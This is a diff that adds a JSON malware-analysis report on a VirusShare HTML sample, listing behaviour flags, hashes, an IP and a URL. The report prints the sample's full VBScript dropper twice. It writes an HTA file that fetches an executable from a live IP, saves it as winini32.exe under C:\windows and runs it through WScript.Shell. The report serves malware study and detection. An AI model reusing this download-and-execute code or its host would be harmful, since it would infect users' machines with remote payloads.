@@ -1,0 +1,59 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Call": "May call a DLL using Excel 4 Macros",
+            "CreateObject": "May create an OLE object",
+            "Open": "May open a file",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "adodb.stream": "May create a text file",
+            "msxml2.XMLHTTP": "May download files from the Internet",
+            "savetofile": "May create a text file",
+            "windows": "May enumerate application windows",
+            "write": "May write to a file"
+        },
+        "macro": "on error resume next\nset evanchik = CreateObject(\"ADODB.Recordset\")\n   With evanchik\n       .Fields.Append \"evanchik\", 200, \"3000\"\n       Call .Open\n       Call .AddNew\n       .Fields(\"evanchik\").Value = \"<script language=vbscript>: on error resume next : set o = CreateObject(\"\"msxml2.XMLHTTP\"\") : o.open \"\"GET\"\",\"\"http://195.95.218.83/users/sale/web/last/test.exe\"\",False : o.send : set s = createobject(\"\"adodb.stream\"\") : s.type=1 : s.open : s.write o.responseBody : s.savetofile \"\"C:\\windows\\winini32.exe\"\",2 : Set ws = CreateObject(\"\"WScript.Shell\"\") : ws.Run \"\"C:\\windows\\winini32.exe\"\", 3, FALSE : </script>\"\n       Call .Update\n   End With\nevanchik.Save \"C:\\windows\\tmp.hta\", adPersistXML\nevanchik.Close"
+    },
+    "filename": "VirusShare_135df2eb7b5c2c2d8a339476db550ef7",
+    "filesize": 712,
+    "filetype": "HTML document, ASCII text, with very long lines",
+    "hashes": {
+        "md5": "135df2eb7b5c2c2d8a339476db550ef7",
+        "sha1": "2e6eb92bf4db1fb8080379aaf82a2d82b0d80a7c",
+        "sha256": "fe4781b876ed4e9dd684d4da4d73a86a0eb9a46790e8e5341f8a4b1151bb7e1d"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "on error resume next",
+            "set evanchik = CreateObject(\"ADODB.Recordset\")",
+            "   With evanchik",
+            "       .Fields.Append \"evanchik\", 200, \"3000\"",
+            "       Call .Open",
+            "       Call .AddNew",
+            "       .Fields(\"evanchik\").Value = \"<script language=vbscript>: on error resume next : set o = CreateObject(\"\"msxml2.XMLHTTP\"\") : o.open \"\"GET\"\",\"\"http://195.95.218.83/users/sale/web/last/test.exe\"\",False : o.send : set s = createobject(\"\"adodb.stream\"\") : s.type=1 : s.open : s.write o.responseBody : s.savetofile \"\"C:\\windows\\winini32.exe\"\",2 : Set ws = CreateObject(\"\"WScript.Shell\"\") : ws.Run \"\"C:\\windows\\winini32.exe\"\", 3, FALSE : </script>\"",
+            "       Call .Update",
+            "   End With",
+            "evanchik.Save \"C:\\windows\\tmp.hta\", adPersistXML",
+            "evanchik.Close"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [
+            "195.95.218.83"
+        ],
+        "url": [
+            "http://195.95.218.83/users/sale/web/last/test.exe"
+        ]
+    },
+    "time": "0:00:00.270594",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
